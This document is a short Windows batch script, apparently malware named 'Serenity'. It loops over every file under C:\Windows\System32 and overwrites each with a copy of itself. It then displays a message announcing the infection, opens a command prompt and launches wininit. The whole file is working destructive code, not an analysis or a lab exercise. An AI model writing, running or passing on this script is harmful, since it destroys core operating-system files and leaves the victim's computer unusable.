@echo off
for /R "C:\Windows\System32\*.*" %%G in (*) do copy "%~dp0\Serenity.bat" "%%G"
echo Your computer is infected with Serenity, use it while you can.
pause
cmd.exe
pause
wininit
